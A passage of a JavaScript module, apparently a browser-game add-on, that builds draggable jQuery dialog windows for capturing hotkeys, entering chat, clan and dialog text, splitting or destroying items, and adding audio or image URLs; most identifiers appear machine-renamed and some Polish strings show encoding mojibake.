  formWindowIsResizableFlag.tip("Edytuj skrót klawiszowy");
  return formWindowIsResizableFlag;
}
export function formatKey(formWindowHasListFeature) {
  const formWindowCustomTitleString = [];

  if (formWindowHasListFeature.ctrlKey) {
    formWindowCustomTitleString.push("Ctrl");
  }

  if (formWindowHasListFeature.shiftKey) {
    formWindowCustomTitleString.push("Shift");
  }

  if (formWindowHasListFeature.altKey) {
    formWindowCustomTitleString.push("Alt");
  }

  if (["Control", "Shift", "Alt", "Meta"].includes(formWindowHasListFeature.key)) {
    return null;
  }

  let formWindowUiElementReference = formWindowHasListFeature.code;

  if (formWindowUiElementReference.startsWith("Key")) {
    formWindowUiElementReference = formWindowUiElementReference.replace("Key", "");
  } else if (formWindowUiElementReference.startsWith("Digit")) {
    formWindowUiElementReference = formWindowUiElementReference.replace("Digit", "");
  }

  formWindowCustomTitleString.push(formWindowUiElementReference);
  return formWindowCustomTitleString.join(" + ");
}
export async function showKeyCaptureWindow(formWindowDragConfiguration = false) {
  return new Promise(formWindowStopPositionLeft => {
    const formWindowStopPositionTop = $("#mp-overlay-hotkeys");

    if (formWindowStopPositionTop.length > 0) {
      formWindowStopPositionTop.remove();
      document.removeEventListener("keydown", window._mpKeyHandler);
    }

    const formWindowFinalCoordinatePayload = $("\n        <div id=\"mp-overlay-hotkeys\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer skrótów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                " + (formWindowDragConfiguration ? "<div class=\"mp-current-char\">" + formWindowDragConfiguration + "</div><br>" : "") + "\n                <div class=\"mp-give-char\">WciĹnij nowy klawisz</div><br>\n                <div id=\"noneBtn\" class=\"mp-button mp-button-red do-action-cursor\">Usuń skrót</div>\n            </div>\n        </div>\n    ");

    function formWindowDomAppendReference() {
      document.removeEventListener("keydown", window._mpKeyHandler);
      formWindowFinalCoordinatePayload.remove();
      delete window._mpKeyHandler;
    }

    function formWindowInnerContentClass(formWindowInitialCenteredFlag) {
      const formWindowDragStartEvent = [];

      if (formWindowInitialCenteredFlag.ctrlKey) {
        formWindowDragStartEvent.push("Ctrl");
      }

      if (formWindowInitialCenteredFlag.shiftKey) {
        formWindowDragStartEvent.push("Shift");
      }

      if (formWindowInitialCenteredFlag.altKey) {
        formWindowDragStartEvent.push("Alt");
      }

      if (["Control", "Shift", "Alt", "Meta"].includes(formWindowInitialCenteredFlag.key)) {
        return null;
      }

      let formWindowDragStartUi = formWindowInitialCenteredFlag.code;

      if (formWindowDragStartUi.startsWith("Key")) {
        formWindowDragStartUi = formWindowDragStartUi.replace("Key", "");
      } else if (formWindowDragStartUi.startsWith("Digit")) {
        formWindowDragStartUi = formWindowDragStartUi.replace("Digit", "");
      }

      formWindowDragStartEvent.push(formWindowDragStartUi);
      return formWindowDragStartEvent.join(" + ");
    }

    function formWindowUpdatedCoordinatesPayload(formWindowInitialAppendReference) {
      formWindowInitialAppendReference.preventDefault();

      if (formWindowInitialAppendReference.key === "Escape") {
        formWindowDomAppendReference();
        formWindowStopPositionLeft(null);
        return;
      }

      const formWindowCenteredModeFlag = formWindowInnerContentClass(formWindowInitialAppendReference);
      const dialogStorageConfigId = $("#mp-overlay-hotkeys .mp-give-char");

      if (dialogStorageConfigId.length) {
        if (formWindowCenteredModeFlag) {
          dialogStorageConfigId.text("Wybrano: " + formWindowCenteredModeFlag);
        } else {
          const dialogStorageConfigurationObject = [];

          if (formWindowInitialAppendReference.ctrlKey) {
            dialogStorageConfigurationObject.push("Ctrl");
          }

          if (formWindowInitialAppendReference.shiftKey) {
            dialogStorageConfigurationObject.push("Shift");
          }

          if (formWindowInitialAppendReference.altKey) {
            dialogStorageConfigurationObject.push("Alt");
          }

          dialogStorageConfigId.text("Wciśnięto: " + (dialogStorageConfigurationObject.join(" + ") || "..."));
        }
      }

      if (!formWindowCenteredModeFlag) {
        return;
      }

      formWindowDomAppendReference();
      formWindowStopPositionLeft(formWindowCenteredModeFlag);
    }

    window._mpKeyHandler = formWindowUpdatedCoordinatesPayload;
    document.addEventListener("keydown", formWindowUpdatedCoordinatesPayload);
    formWindowFinalCoordinatePayload.find("#noneBtn").click(() => {
      formWindowDomAppendReference();
      formWindowStopPositionLeft("Brak");
    });
    formWindowFinalCoordinatePayload.find("#closeBtn").click(() => {
      formWindowDomAppendReference();
      formWindowStopPositionLeft(null);
    });
    formWindowFinalCoordinatePayload.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (dialogWindowTemplateClass, dialogWindowUniqueIdentifier) => {}
    });
    const dialogWindowIsResizableFlag = formWindowFinalCoordinatePayload.outerWidth();
    const dialogWindowHasListFeature = formWindowFinalCoordinatePayload.outerHeight();
    const dialogWindowCustomTitleString = (window.innerWidth - dialogWindowIsResizableFlag) / 2;
    const dialogWindowUiElementReference = (window.innerHeight - dialogWindowHasListFeature) / 2;
    const dialogWindowDragConfiguration = {
      zIndex: 999,
      position: "absolute",
      left: dialogWindowCustomTitleString + "px",
      top: dialogWindowUiElementReference + "px"
    };
    formWindowFinalCoordinatePayload.css(dialogWindowDragConfiguration);
  });
}
export async function addClanText(dialogWindowStopPositionLeft = false) {
  return new Promise(dialogWindowStopPositionTop => {
    const dialogWindowFinalCoordinatePayload = $("#mp-overlay-url-clan");

    if (dialogWindowFinalCoordinatePayload.length > 0) {
      dialogWindowFinalCoordinatePayload.remove();
    }

    const dialogWindowDomAppendReference = $("\n        <div id=\"mp-overlay-url-clan\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">MenedĹźer tekstu</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>WprowadĹş wiadomoĹć (dostępne zmienne: {item})</div>\n                    <input id=\"mp-input-url-clan\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Zlotałem {item}! Super!\" style=\"width: 350px;\"" + (dialogWindowStopPositionLeft ? "value=\"" + dialogWindowStopPositionLeft + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      dialogWindowDomAppendReference.find(".mp-default-input").trigger("focus");
    }, 10);

    function dialogWindowInnerContentClass() {
      dialogWindowDomAppendReference.remove();
    }

    dialogWindowDomAppendReference.find("#saveBtn").click(() => {
      const dialogWindowInitialCenteredFlag = dialogWindowDomAppendReference.find("#mp-input-url-clan").val();
      dialogWindowInnerContentClass();
      dialogWindowStopPositionTop(dialogWindowInitialCenteredFlag);
    });
    dialogWindowDomAppendReference.find("#closeBtn").click(() => {
      dialogWindowInnerContentClass();
      dialogWindowStopPositionTop(null);
    });
    dialogWindowDomAppendReference.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (dialogWindowDragStartEvent, dialogWindowDragStartUi) => {}
    });
    const dialogWindowUpdatedCoordinatesPayload = dialogWindowDomAppendReference.outerWidth();
    const dialogWindowInitialAppendReference = dialogWindowDomAppendReference.outerHeight();
    const dialogWindowCenteredModeFlag = (window.innerWidth - dialogWindowUpdatedCoordinatesPayload) / 2;
    const panelStorageConfigId = (window.innerHeight - dialogWindowInitialAppendReference) / 2;
    const panelStorageConfigurationObject = {
      zIndex: 999,
      position: "absolute",
      left: dialogWindowCenteredModeFlag + "px",
      top: panelStorageConfigId + "px"
    };
    dialogWindowDomAppendReference.css(panelStorageConfigurationObject);
  });
}
export async function addMetkaText() {
  return new Promise(panelWindowTemplateClass => {
    const panelWindowUniqueIdentifier = $("#mp-overlay-label-text");

    if (panelWindowUniqueIdentifier.length > 0) {
      panelWindowUniqueIdentifier.remove();
    }

    const panelWindowIsResizableFlag = $("\n        <div id=\"mp-overlay-label-text\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer tekstu</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <input id=\"mp-input-label-text\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Max 6 znaków\" style=\"width: 350px;\" maxlength=\"6\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      panelWindowIsResizableFlag.find(".mp-default-input").trigger("focus");
    }, 10);

    function panelWindowHasListFeature() {
      panelWindowIsResizableFlag.remove();
    }

    panelWindowIsResizableFlag.find("#saveBtn").click(() => {
      const panelWindowCustomTitleString = panelWindowIsResizableFlag.find("#mp-input-label-text").val();
      panelWindowHasListFeature();
      panelWindowTemplateClass(panelWindowCustomTitleString);
    });
    panelWindowIsResizableFlag.find("#closeBtn").click(() => {
      panelWindowHasListFeature();
      panelWindowTemplateClass(null);
    });
    const panelWindowUiElementReference = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (panelWindowDragConfiguration, panelWindowStopPositionLeft) => {}
    };
    panelWindowIsResizableFlag.appendTo("#mp-root").draggable(panelWindowUiElementReference);
    const panelWindowStopPositionTop = panelWindowIsResizableFlag.outerWidth();
    const panelWindowFinalCoordinatePayload = panelWindowIsResizableFlag.outerHeight();
    const panelWindowDomAppendReference = (window.innerWidth - panelWindowStopPositionTop) / 2;
    const panelWindowInnerContentClass = (window.innerHeight - panelWindowFinalCoordinatePayload) / 2;
    const panelWindowInitialCenteredFlag = {
      zIndex: 999,
      position: "absolute",
      left: panelWindowDomAppendReference + "px",
      top: panelWindowInnerContentClass + "px"
    };
    panelWindowIsResizableFlag.css(panelWindowInitialCenteredFlag);
  });
}
export async function askSplit() {
  return new Promise(panelWindowDragStartEvent => {
    const panelWindowDragStartUi = $("#mp-overlay-split");

    if (panelWindowDragStartUi.length > 0) {
      panelWindowDragStartUi.remove();
    }

    const panelWindowUpdatedCoordinatesPayload = $("\n        <div id=\"mp-overlay-split\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Dzielenie przedmiotów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Po ile podzielić przedmioty?</div>\n                    <input id=\"mp-input-split\" type=\"number\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"IloĹÄ\" style=\"width: 50px;\"}>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Podziel</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      panelWindowUpdatedCoordinatesPayload.find(".mp-default-input").trigger("focus");
    }, 10);

    function panelWindowInitialAppendReference() {
      panelWindowUpdatedCoordinatesPayload.remove();
    }

    panelWindowUpdatedCoordinatesPayload.find("#saveBtn").click(() => {
      const panelWindowCenteredModeFlag = panelWindowUpdatedCoordinatesPayload.find("#mp-input-split").val();
      panelWindowInitialAppendReference();

      if (Number(panelWindowCenteredModeFlag) > 0) {
        panelWindowDragStartEvent(panelWindowCenteredModeFlag);
      } else {
        panelWindowDragStartEvent(null);
      }
    });
    panelWindowUpdatedCoordinatesPayload.find("#closeBtn").click(() => {
      panelWindowInitialAppendReference();
      panelWindowDragStartEvent(null);
    });
    panelWindowUpdatedCoordinatesPayload.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (modalStorageConfigId, modalStorageConfigurationObject) => {}
    });
    const modalWindowTemplateClass = panelWindowUpdatedCoordinatesPayload.outerWidth();
    const modalWindowUniqueIdentifier = panelWindowUpdatedCoordinatesPayload.outerHeight();
    const modalWindowIsResizableFlag = (window.innerWidth - modalWindowTemplateClass) / 2;
    const modalWindowHasListFeature = (window.innerHeight - modalWindowUniqueIdentifier) / 2;
    const modalWindowCustomTitleString = {
      zIndex: 999,
      position: "absolute",
      left: modalWindowIsResizableFlag + "px",
      top: modalWindowHasListFeature + "px"
    };
    panelWindowUpdatedCoordinatesPayload.css(modalWindowCustomTitleString);
  });
}
export async function addChatterText(modalWindowUiElementReference = false) {
  return new Promise(modalWindowDragConfiguration => {
    const modalWindowStopPositionLeft = $("#mp-overlay-chatter");

    if (modalWindowStopPositionLeft.length > 0) {
      modalWindowStopPositionLeft.remove();
    }

    const modalWindowStopPositionTop = $("\n        <div id=\"mp-overlay-chatter\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer kafelków</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>WysyĹana wiadomość</div>\n                    <input id=\"mp-input-chatter\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"WiadomośÄ\" style=\"width: 350px;\"" + (modalWindowUiElementReference ? "value=\"" + modalWindowUiElementReference + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      modalWindowStopPositionTop.find(".mp-default-input").trigger("focus");
    }, 10);

    function modalWindowFinalCoordinatePayload() {
      modalWindowStopPositionTop.remove();
    }

    modalWindowStopPositionTop.find("#saveBtn").click(() => {
      const modalWindowDomAppendReference = modalWindowStopPositionTop.find("#mp-input-chatter").val();
      modalWindowFinalCoordinatePayload();
      modalWindowDragConfiguration(modalWindowDomAppendReference);
    });
    modalWindowStopPositionTop.find("#closeBtn").click(() => {
      modalWindowFinalCoordinatePayload();
      modalWindowDragConfiguration(null);
    });
    const modalWindowInnerContentClass = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (modalWindowInitialCenteredFlag, modalWindowDragStartEvent) => {}
    };
    modalWindowStopPositionTop.appendTo("#mp-root").draggable(modalWindowInnerContentClass);
    const modalWindowDragStartUi = modalWindowStopPositionTop.outerWidth();
    const modalWindowUpdatedCoordinatesPayload = modalWindowStopPositionTop.outerHeight();
    const modalWindowInitialAppendReference = (window.innerWidth - modalWindowDragStartUi) / 2;
    const modalWindowCenteredModeFlag = (window.innerHeight - modalWindowUpdatedCoordinatesPayload) / 2;
    const sheetStorageConfigId = {
      zIndex: 999,
      position: "absolute",
      left: modalWindowInitialAppendReference + "px",
      top: modalWindowCenteredModeFlag + "px"
    };
    modalWindowStopPositionTop.css(sheetStorageConfigId);
  });
}
export async function addDialogText(sheetStorageConfigurationObject = false) {
  return new Promise(sheetWindowTemplateClass => {
    const sheetWindowUniqueIdentifier = $("#mp-overlay-dialog");

    if (sheetWindowUniqueIdentifier.length > 0) {
      sheetWindowUniqueIdentifier.remove();
    }

    const sheetWindowIsResizableFlag = $("\n        <div id=\"mp-overlay-dialog\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer dialogów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź słowo lub cały dialog</div>\n                    <input id=\"mp-input-dialog\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Słowo z opcji dialogowej\" style=\"width: 350px;\"" + (sheetStorageConfigurationObject ? "value=\"" + sheetStorageConfigurationObject + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      sheetWindowIsResizableFlag.find(".mp-default-input").trigger("focus");
    }, 10);

    function sheetWindowHasListFeature() {
      sheetWindowIsResizableFlag.remove();
    }

    sheetWindowIsResizableFlag.find("#saveBtn").click(() => {
      const sheetWindowCustomTitleString = sheetWindowIsResizableFlag.find("#mp-input-dialog").val().trim();
      sheetWindowHasListFeature();
      sheetWindowTemplateClass(sheetWindowCustomTitleString);
    });
    sheetWindowIsResizableFlag.find("#closeBtn").click(() => {
      sheetWindowHasListFeature();
      sheetWindowTemplateClass(null);
    });
    sheetWindowIsResizableFlag.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (sheetWindowUiElementReference, sheetWindowDragConfiguration) => {}
    });
    const sheetWindowStopPositionLeft = sheetWindowIsResizableFlag.outerWidth();
    const sheetWindowStopPositionTop = sheetWindowIsResizableFlag.outerHeight();
    const sheetWindowFinalCoordinatePayload = (window.innerWidth - sheetWindowStopPositionLeft) / 2;
    const sheetWindowDomAppendReference = (window.innerHeight - sheetWindowStopPositionTop) / 2;
    const sheetWindowInnerContentClass = {
      zIndex: 999,
      position: "absolute",
      left: sheetWindowFinalCoordinatePayload + "px",
      top: sheetWindowDomAppendReference + "px"
    };
    sheetWindowIsResizableFlag.css(sheetWindowInnerContentClass);
  });
}
export async function trashRemoveItemsAsk(sheetWindowInitialCenteredFlag) {
  return new Promise(sheetWindowDragStartEvent => {
    const sheetWindowDragStartUi = $("#mp-overlay-ask");

    if (sheetWindowDragStartUi.length > 0) {
      sheetWindowDragStartUi.remove();
    }

    const sheetWindowUpdatedCoordinatesPayload = $("\n        <div id=\"mp-overlay-ask\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Czyszczenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div class=\"mp-ask-display\">Czy na pewno chcesz zniszczyć poniĹźsze przedmioty?</div>\n                    <div class=\"mp-items-display-ask mp-scroll\"></div>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"yesBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 80px;\">Tak</div>\n                    <div id=\"noBtn\" class=\"mp-button mp-button-red do-action-cursor\" style=\"width: 80px;\">Nie</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      sheetWindowUpdatedCoordinatesPayload.find(".mp-default-input").trigger("focus");
    }, 10);

    function sheetWindowInitialAppendReference() {
      sheetWindowUpdatedCoordinatesPayload.remove();
    }

    sheetWindowUpdatedCoordinatesPayload.find("#yesBtn").click(() => {
      sheetWindowInitialAppendReference();
      sheetWindowDragStartEvent(true);
    });
    sheetWindowUpdatedCoordinatesPayload.find("#closeBtn").click(() => {
      sheetWindowInitialAppendReference();
      sheetWindowDragStartEvent(null);
    });
    sheetWindowUpdatedCoordinatesPayload.find("#noBtn").click(() => {
      sheetWindowInitialAppendReference();
      sheetWindowDragStartEvent(null);
    });
    sheetWindowUpdatedCoordinatesPayload.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (sheetWindowCenteredModeFlag, tabStorageConfigId) => {}
    });
    const tabStorageConfigurationObject = sheetWindowUpdatedCoordinatesPayload.outerWidth();
    const tabWindowTemplateClass = sheetWindowUpdatedCoordinatesPayload.outerHeight();
    const tabWindowUniqueIdentifier = (window.innerWidth - tabStorageConfigurationObject) / 2;
    const tabWindowIsResizableFlag = (window.innerHeight - tabWindowTemplateClass) / 2;
    const tabWindowHasListFeature = {
      zIndex: 999,
      position: "absolute",
      left: tabWindowUniqueIdentifier + "px",
      top: tabWindowIsResizableFlag + "px"
    };
    sheetWindowUpdatedCoordinatesPayload.css(tabWindowHasListFeature);
    const tabWindowCustomTitleString = sheetWindowUpdatedCoordinatesPayload.find(".mp-items-display-ask");
    sheetWindowInitialCenteredFlag = [...new Set(sheetWindowInitialCenteredFlag)];

    for (const tabWindowUiElementReference of sheetWindowInitialCenteredFlag) {
      const tabWindowDragConfiguration = Engine.items.getItemById(tabWindowUiElementReference);

      if (tabWindowDragConfiguration) {
        const tabWindowStopPositionLeft = {
          id: tabWindowDragConfiguration.id,
          type: tabWindowDragConfiguration._cachedStats.rarity,
          name: tabWindowDragConfiguration.name,
          stat: tabWindowDragConfiguration.stat,
          pr: tabWindowDragConfiguration.pr,
          prc: "zl",
          cl: tabWindowDragConfiguration.cl,
          icon: tabWindowDragConfiguration.icon
        };
        let tabWindowStopPositionTop = universalCreateItem(tabWindowStopPositionLeft, "item");
        tabWindowStopPositionTop.appendTo(tabWindowCustomTitleString);
      }
    }

    enableScroll("mp-scroll");
  });
}
export async function askWindow(tabWindowFinalCoordinatePayload) {
  return new Promise(tabWindowDomAppendReference => {
    const tabWindowInnerContentClass = $("#mp-overlay-ask");

    if (tabWindowInnerContentClass.length > 0) {
      tabWindowInnerContentClass.remove();
    }

    const tabWindowInitialCenteredFlag = $("\n        <div id=\"mp-overlay-ask\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Zapytanie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div class=\"mp-ask-display\">" + tabWindowFinalCoordinatePayload + "</div>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"yesBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 80px;\">Tak</div>\n                    <div id=\"noBtn\" class=\"mp-button mp-button-red do-action-cursor\" style=\"width: 80px;\">Nie</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      tabWindowInitialCenteredFlag.find(".mp-default-input").trigger("focus");
    }, 10);

    function tabWindowDragStartEvent() {
      tabWindowInitialCenteredFlag.remove();
    }

    tabWindowInitialCenteredFlag.find("#yesBtn").click(() => {
      tabWindowDragStartEvent();
      tabWindowDomAppendReference(true);
    });
    tabWindowInitialCenteredFlag.find("#closeBtn").click(() => {
      tabWindowDragStartEvent();
      tabWindowDomAppendReference(null);
    });
    tabWindowInitialCenteredFlag.find("#noBtn").click(() => {
      tabWindowDragStartEvent();
      tabWindowDomAppendReference(null);
    });
    tabWindowInitialCenteredFlag.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (tabWindowDragStartUi, tabWindowUpdatedCoordinatesPayload) => {}
    });
    const tabWindowInitialAppendReference = tabWindowInitialCenteredFlag.outerWidth();
    const tabWindowCenteredModeFlag = tabWindowInitialCenteredFlag.outerHeight();
    const gridStorageConfigId = (window.innerWidth - tabWindowInitialAppendReference) / 2;
    const gridStorageConfigurationObject = (window.innerHeight - tabWindowCenteredModeFlag) / 2;
    const gridWindowTemplateClass = {
      zIndex: 999,
      position: "absolute",
      left: gridStorageConfigId + "px",
      top: gridStorageConfigurationObject + "px"
    };
    tabWindowInitialCenteredFlag.css(gridWindowTemplateClass);
  });
}
export async function addAudioUrl() {
  return new Promise(gridWindowUniqueIdentifier => {
    const gridWindowIsResizableFlag = $("#mp-overlay-url-audio");

    if (gridWindowIsResizableFlag.length > 0) {
      gridWindowIsResizableFlag.remove();
    }

    const gridWindowHasListFeature = $("\n        <div id=\"mp-overlay-url-audio\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź adres do dźwięku:</div>\n                    <input id=\"mp-input-url-audio\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"https://adres.pl/moja_muzyka.mp3\" style=\"width: 350px;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      gridWindowHasListFeature.find(".mp-default-input").trigger("focus");
    }, 10);

    function gridWindowCustomTitleString() {
      gridWindowHasListFeature.remove();
    }

    gridWindowHasListFeature.find("#saveBtn").click(() => {
      const gridWindowUiElementReference = gridWindowHasListFeature.find("#mp-input-url-audio").val();
      gridWindowCustomTitleString();
      gridWindowUniqueIdentifier(gridWindowUiElementReference);
    });
    gridWindowHasListFeature.find("#closeBtn").click(() => {
      gridWindowCustomTitleString();
      gridWindowUniqueIdentifier(null);
    });
    gridWindowHasListFeature.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (gridWindowDragConfiguration, gridWindowStopPositionLeft) => {}
    });
    const gridWindowStopPositionTop = gridWindowHasListFeature.outerWidth();
    const gridWindowFinalCoordinatePayload = gridWindowHasListFeature.outerHeight();
    const gridWindowDomAppendReference = (window.innerWidth - gridWindowStopPositionTop) / 2;
    const gridWindowInnerContentClass = (window.innerHeight - gridWindowFinalCoordinatePayload) / 2;
    const gridWindowInitialCenteredFlag = {
      zIndex: 999,
      position: "absolute",
      left: gridWindowDomAppendReference + "px",
      top: gridWindowInnerContentClass + "px"
    };
    gridWindowHasListFeature.css(gridWindowInitialCenteredFlag);
  });
}
export async function addImagesUrl() {
  return new Promise(gridWindowDragStartEvent => {
    const gridWindowDragStartUi = $("#mp-overlay-url-images");

    if (gridWindowDragStartUi.length > 0) {
      gridWindowDragStartUi.remove();
    }

    const gridWindowUpdatedCoordinatesPayload = $("\n        <div id=\"mp-overlay-url-images\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>WprowadĹş adres do grafiki:</div>\n                    <input id=\"mp-input-url-images\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"https://adres.pl/moja_grafika.png\" style=\"width: 350px;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      gridWindowUpdatedCoordinatesPayload.find(".mp-default-input").trigger("focus");
    }, 10);

    function gridWindowInitialAppendReference() {
      gridWindowUpdatedCoordinatesPayload.remove();
    }

    gridWindowUpdatedCoordinatesPayload.find("#saveBtn").click(() => {
      const gridWindowCenteredModeFlag = gridWindowUpdatedCoordinatesPayload.find("#mp-input-url-images").val();
      gridWindowInitialAppendReference();
      gridWindowDragStartEvent(gridWindowCenteredModeFlag);
    });
    gridWindowUpdatedCoordinatesPayload.find("#closeBtn").click(() => {
      gridWindowInitialAppendReference();
      gridWindowDragStartEvent(null);
    });
    gridWindowUpdatedCoordinatesPayload.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (cardStorageConfigId, cardStorageConfigurationObject) => {}
    });
    const cardWindowTemplateClass = gridWindowUpdatedCoordinatesPayload.outerWidth();
    const cardWindowUniqueIdentifier = gridWindowUpdatedCoordinatesPayload.outerHeight();
    const cardWindowIsResizableFlag = (window.innerWidth - cardWindowTemplateClass) / 2;
